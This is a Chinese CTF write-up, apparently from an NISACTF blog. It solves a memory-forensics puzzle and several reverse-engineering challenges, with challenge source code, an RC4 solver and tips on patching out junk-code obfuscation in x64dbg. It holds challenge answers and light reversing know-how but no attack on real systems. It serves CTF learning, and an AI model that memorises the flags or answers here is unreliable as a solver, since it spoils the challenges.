+<p>发现这是一个windows的镜像</p>
+<p>pslist扫描当前进程无果</p>
+<p>filescan查看可疑文件（这里grep了一下Desktop)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/EkmSVNoayfE63SzB.png!thumbnail" alt="img"></p>
+<p>发现flower.zip、pwd.txt有点可疑，分别导出并重命名<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/58c0lSMvqOsqDrPb.png!thumbnail" alt="img">pwd.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/YG7M9pKLl8xOuwPP.png!thumbnail" alt="img"></p>
+<p>flower.zip</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/SwpG1c3pyH00ARs8.png!thumbnail" alt="img"></p>
+<p>得到一个加密压缩包image.rarbasecrack解密一下pwd.txt的密文（根据题目套娃可猜测多层base加密)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/JcEZRrC5c0mgtd64.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/JdnzJWDgLhncSXim.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/pPh7fzGlsKuIhsUe.png!thumbnail" alt="img"></p>
+<p>这里发现解密出来的结果不大正常，尝试一下base64更换字母表解密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/Rx40qkfpjek0VAFW.png!thumbnail" alt="img"></p>
+<p>成功解出了密码解压压缩包<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/Ni6rkM5TY4A1oxPz.png!thumbnail" alt="img">得到了许多拼图碎片注意到题目又给出了array.txt文件，查看发现为unicode编码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/e8Pj9EGU3bFcIuic.png!thumbnail" alt="img"></p>
+<p>进行解码<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/eCXYOzSz5CaXLPCb.png!thumbnail" alt="img">继续basecrack</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/Cwj9hs2vnu5NG1ia.png!thumbnail" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/ahgQuAeBB0EwesMy.png!thumbnail" alt="img"></p>
+<p>这里发现解密结果数字字母符合Hex范围，尝试转Hex</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/BBql1bBAROP2PxaI.png!thumbnail" alt="img"></p>
+<p>得到一串范围为0-36的数字序列</p>
+<p>观察可发现先前的拼图碎片正好为36张，因此可将上述得到的数字序列按顺序排列为6x6的矩阵进行拼j图（另一个思路：根据给出的数组进行手动拼接）</p>
+<p>图exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">name_list = [[32, 24, 6, 28, 15, 31],</span><br><span class="line">             [7, 23, 13, 27, 30, 33],</span><br><span class="line">             [12, 8, 5, 26, 29, 16],</span><br><span class="line">             [34, 22, 2, 14, 9, 17],</span><br><span class="line">             [21, 1, 19, 10, 4, 36],</span><br><span class="line">             [35, 25, 11, 20, 3, 18]]</span><br><span class="line">img = Image.open(&quot;./image/1.png&quot;)</span><br><span class="line">width, height = img.size</span><br><span class="line">crop_width = width * 6</span><br><span class="line">crop_height = height * 6</span><br><span class="line"></span><br><span class="line">image = Image.new(&#x27;RGB&#x27;, (crop_width, crop_height))</span><br><span class="line"></span><br><span class="line"># 利用循环将所有图片拼接到创建的新图片上</span><br><span class="line">for i in range(0,6):</span><br><span class="line">    for j in range(0,6):</span><br><span class="line">        name = str(name_list[i][j]) + &quot;.png&quot;</span><br><span class="line">        s_image = Image.open(&quot;./image/&quot; + name)</span><br><span class="line">        box2 = (width * j, height * i, width * (j + 1), height * (i + 1))</span><br><span class="line">        image.paste(s_image, box2)</span><br><span class="line"></span><br><span class="line">image.show()</span><br></pre></td></tr></table></figure>
+
+<p>得到图片<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/NeUetPBw4XOF78CM.png!thumbnail" alt="img">将字符逐行排列到一起，得到字符串：58s4vb6rt4pt5r32yd6ht5u656555r6796524vi69r2yd5om6w0</p>
+<p>进行twin-hex解密得到最终flag</p>
+<p><a target="_blank" rel="noopener" href="https://www.calcresult.com/misc/cyphers/twin-hex.html">https://www.calcresult.com/misc/cyphers/twin-hex.html</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/eB7rZ3dQJSUl79KO.png!thumbnail" alt="img"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="sign-c"><a href="#sign-c" class="headerlink" title="sign-c++"></a>sign-c++</h3><p>源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;iostream&gt; </span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">char flag[0x30]=&quot;DYYI^Lq~bcyUcyUDCYKUxoUycmdw&quot;;</span><br><span class="line">​</span><br><span class="line">class Human&#123;</span><br><span class="line">private:</span><br><span class="line">    virtual void give_flag()&#123;</span><br><span class="line">        int i;</span><br><span class="line">        for(i=0;i&lt;strlen(flag);i++)&#123;</span><br><span class="line">            flag[i] ^= 0xa;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">protected:</span><br><span class="line">    int age;</span><br><span class="line">    string name;</span><br><span class="line">public:</span><br><span class="line">    virtual void introduce()&#123;</span><br><span class="line">        cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">​</span><br><span class="line">class Man: public Human&#123;</span><br><span class="line">public:</span><br><span class="line">    Man(string name, int age)&#123;</span><br><span class="line">        this-&gt;name = name;</span><br><span class="line">        this-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        virtual void introduce()&#123;</span><br><span class="line">        Human::introduce();</span><br><span class="line">                cout &lt;&lt; &quot;I am a nice game!&quot; &lt;&lt; endl;</span><br><span class="line">                cout &lt;&lt; &quot;welcome to you!&quot;  &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    Human* m = new Man(&quot;NISACTF&quot;, 4);</span><br><span class="line">    m-&gt;introduce();</span><br><span class="line">    delete m;</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281353360.png" alt="img"></p>
+<p>直接进去看，实际上就是定义了一个Human的父类，定义了一个man的子类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281356579.png" alt="img"></p>
+<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>实际上flag函数实现的就是strlen(buf); </p>
+<p>可以通过特征值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281357998.png" alt="img"></p>
+<p>因为这是ida，比较常见的一个反编译问题。如果看不出来，或者没有意识到，就只能一步步看下来，因为程序也比较简单。</p>
+<p><a target="_blank" rel="noopener" href="https://www.codenong.com/cs105974546/">https://www.codenong.com/cs105974546/</a></p>
+<p>当然通过gdb动调查看参数的值，或者将参数的值改为13也都是可以的。都是很方便快捷的方法</p>
+<p>就进ida，然后断点到flag函数，然后print 变量 = 13就行了</p>
+<p>13^0x1a=23，输入23个a就行了</p>
+<p>当然这题出的不好，没有对seed进行加密，可以直接写一个循环脚本，然后flag就出来了（…..我的锅)</p>
+<p>当然，由于是ELF文件，肯定要在linux平台的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281430587.png" alt="img"></p>
+<h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281432221.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281439666.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281457980.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281457098.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281457903.png" alt="img"></p>
+<p>在decrypto2函数末尾加一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (secret)</span><br></pre></td></tr></table></figure>
+
+<p>就可以打印出true key了。这个逆向python的过程也比较简单。</p>
+<p>然后随便输入个key，就能发现true key = this is true key</p>
+<p>​    <img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281458048.png" alt="img"></p>
+<h3 id="tears-confusion"><a href="#tears-confusion" class="headerlink" title="tears-confusion"></a>tears-confusion</h3><p>v1:emmm，其实就是一个rc4算法，套上了一些简单混淆</p>
+<p>v2:感觉这太简单了，进去复制代码然后出来编译一下就好了，所以加了亿点点代码</p>
+<p>首先混淆main函数，通过改变WinMainCRTstarup函数对main函数的定向，指向</p>
+<p>fake_main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281458257.png" alt="img"></p>
+<p>然后对true_main函数终极垃圾代码，好像加了10w行还是20w行垃圾代码，反正基本上是反编译不了的。</p>
+<p>如果厉害的话，就直接读汇编就好了。如果想反编译就用x64dbg，把一段汇编全改成ret就行了。</p>
+<p>为什么不只改一处就行了：因为有可能你改的地方，本身就不会被执行，所以要改一段，保证ret指令被执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281459964.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281501548.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281501031.png" alt="img"></p>
+<p>ctrl+p，修补文件保存为exe</p>
+<p>如果要把main函数的定向改回来，就到ida里面查看WinMainCRTstarup函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281500508.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281500508.png"></p>
+<p>然后也是一样去x64dbg上面改成true_main就好了，不过也不影响做题就是了，只是有点难看</p>
+<p>然后就能正常反编译了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281501274.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281502255.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">​</span><br><span class="line">struct giao</span><br><span class="line">&#123;</span><br><span class="line">    int x, y, m[256];</span><br><span class="line">&#125;;</span><br><span class="line">struct giao s;</span><br><span class="line">typedef unsigned char     uint8;</span><br><span class="line">int length = 8;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint8 flag[100] = &#123; 0 &#125;;</span><br><span class="line">    uint8 cmp[] = &#123;0x12,0xa7,0xf5,0xde,0x75,0x2a,0x6e,0x4a,0x6e,0x73,0xe6,0x62,0x50,0xbf,0x2a,0x98,0xfe,0x2b,0xdd,0x7b,0xba,0xb6,0x5,0x13,0x63,0x57,0x2d,0xd4,0x45,0xb8,0xfe,0xbc &#125;;</span><br><span class="line">    BYTE  key[8] = &#123;0x42,0x60,0x6,0x24,0xca,0xe8,0x8e,0xac&#125;;</span><br><span class="line">    </span><br><span class="line">    int i, j, k, a,b,v8,v9,v14[100];</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    char buf[80];</span><br><span class="line">​</span><br><span class="line">    i = 249948;</span><br><span class="line">    for ( j = 1; ; j += 5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = j++ &lt;= 6;</span><br><span class="line">      if ( !v8 )</span><br><span class="line">        break;</span><br><span class="line">      i /= j;</span><br><span class="line">      i -= 5;</span><br><span class="line">    &#125;</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line"></span><br><span class="line">int q,p;</span><br><span class="line">    memset(&amp;s, 0, sizeof(s));</span><br><span class="line">    s.x = 0;</span><br><span class="line">    s.y = 0;</span><br><span class="line">    for (q = 0; q &lt; 256; q++)</span><br><span class="line">        s.m[q] = q;</span><br><span class="line">    p = k = 0;</span><br><span class="line">    for (q = 0; q &lt; 256; q++)</span><br><span class="line">    &#123;</span><br><span class="line">        a = s.m[q];</span><br><span class="line">        p = (uint8)(p + a + key[k]);</span><br><span class="line">        s.m[q] = s.m[p]; </span><br><span class="line">        s.m[p] = a;</span><br><span class="line">        if (++k &gt;= length)</span><br><span class="line">            k = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  int count=0;</span><br><span class="line">    for (q = 0; q &lt; length; q++)</span><br><span class="line">    &#123;</span><br><span class="line">        s.x = (uint8)(s.x + 1);</span><br><span class="line">        a = s.m[s.x];</span><br><span class="line">        s.y = (uint8)(s.y + a);</span><br><span class="line">        s.m[s.x] = b = s.m[s.y];</span><br><span class="line">        s.m[s.y] = a;</span><br><span class="line">        if(buf[q] == (cmp[q] ^ s.m[(uint8)(a + b)]))&#123;</span><br><span class="line">                count++;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">        puts(&quot;sorry! It is a fake flag!&quot;);</span><br><span class="line">        system(&quot;pause&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;&#125;</span><br><span class="line">    if(count==32)&#123;</span><br><span class="line">        puts(&quot;you get the flag!&quot;);</span><br><span class="line">        printf(&quot;NSSCTF&#123;%s&#125;&quot;, buf);</span><br><span class="line">        system(&quot;pause&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">void lo2(BYTE * buf)&#123;</span><br><span class="line">    int i,len;</span><br><span class="line">    len = strlen(buf);</span><br><span class="line">    for(i=0;i&lt;len;i++)&#123;</span><br><span class="line">        buf[i] = buf[i]^(((0x22 &lt;&lt; 4) ^ (0x22 &gt;&gt; 5)) + 0x22);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line">void lo0()&#123;</span><br><span class="line">      int v0; // cc</span><br><span class="line">  int v2; // [esp+0h] [ebp-8h]</span><br><span class="line">  int i; // [esp+4h] [ebp-4h]</span><br><span class="line">  int v4; // [esp+4h] [ebp-4h]</span><br><span class="line">​</span><br><span class="line">  v2 = 75;</span><br><span class="line">  for ( i = 1; ; i = v4 + 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i &lt;= 2;</span><br><span class="line">    v4 = i + 1;</span><br><span class="line">    if ( !v0 )</span><br><span class="line">      break;</span><br><span class="line">    v2 = v2 / v4 - 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br><span class="line">void lo1()&#123;</span><br><span class="line">    int i ,j;</span><br><span class="line">    int sum=0;</span><br><span class="line">    int m=99;</span><br><span class="line">    for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">            sum--;</span><br><span class="line">            for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">                sum++;</span><br><span class="line">                for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                    for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">            sum--;</span><br><span class="line">            for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">                sum++;</span><br><span class="line">                for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">            sum--;</span><br><span class="line">            for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">                sum++;</span><br><span class="line">                for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                        for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">            sum--;</span><br><span class="line">            for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">                sum++;</span><br><span class="line">                for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                        for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">            sum--;</span><br><span class="line">            for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">                sum++;</span><br><span class="line">                for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                        for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">            sum--;</span><br><span class="line">            for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">                sum++;</span><br><span class="line">                for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                        for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">            sum--;</span><br><span class="line">            for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">                sum++;</span><br><span class="line">                for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                        for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">        sum++;</span><br><span class="line">        for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">            sum--;</span><br><span class="line">            for(i=0;i&lt;m;i++)&#123;</span><br><span class="line">                sum++;</span><br><span class="line">                for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在ida里面找出特征值，然后复制下来就行了</p>
+<p>对key加密了一下</p>
+<p>其他的就是没啥用的小混淆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">​</span><br><span class="line">struct rc4</span><br><span class="line">&#123;</span><br><span class="line">    int x, y, m[256];</span><br><span class="line">&#125;;</span><br><span class="line">​</span><br><span class="line">typedef unsigned char     uint8;</span><br><span class="line">​</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint8 flag[100] = &#123; 0 &#125;;</span><br><span class="line">    uint8 cmp[] = &#123; 0x12,0xa7,0xf5,0xde,0x75,0x2a,0x6e,0x4a,0x6e,0x73,0xe6,0x62,0x50,0xbf,0x2a,0x98,0xfe,0x2b,0xdd,0x7b,0xba,0xb6,0x5,0x13,0x63,0x57,0x2d,0xd4,0x45,0xb8,0xfe,0xbc &#125;;</span><br><span class="line">    BYTE  key[8] = &#123; 0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF &#125;;</span><br><span class="line">    int i, j, k, a,b;</span><br><span class="line">    struct rc4 s;</span><br><span class="line">    int length = 8;</span><br><span class="line">    memset(&amp;s, 0, sizeof(s));</span><br><span class="line">    s.x = 0;</span><br><span class="line">    s.y = 0;</span><br><span class="line">    for (i = 0; i &lt; 256; i++)</span><br><span class="line">        s.m[i] = i;</span><br><span class="line">    j = k = 0;</span><br><span class="line">    for (i = 0; i &lt; 256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a = s.m[i];</span><br><span class="line">        j = (uint8)(j + a + key[k]);</span><br><span class="line">        s.m[i] = s.m[j]; </span><br><span class="line">        s.m[j] = a;</span><br><span class="line">        if (++k &gt;= length)</span><br><span class="line">            k = 0;</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line">    length = 32;</span><br><span class="line">    for (i = 0; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s.x = (uint8)(s.x + 1);</span><br><span class="line">        a = s.m[s.x];</span><br><span class="line">        s.y = (uint8)(s.y + a);</span><br><span class="line">        s.m[s.x] = b = s.m[s.y];</span><br><span class="line">        s.m[s.y] = a;</span><br><span class="line">        flag[i] = cmp[i] ^ s.m[(uint8)(a + b)];</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;NSSCTF&#123;%s&#125;&quot;, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203281503340.png" alt="img"></p>
+<h3 id="sad-MAZE"><a href="#sad-MAZE" class="headerlink" title="sad-MAZE"></a>sad-MAZE</h3><p>v1:就一个Dfs的算法写的迷宫</p>
+<p>具体的算法实现过程可以自己搜一下</p>
+<p>v2:觉得这样太简单了，Dfs算法到处都是，所以加了点简单的花指令。</p>
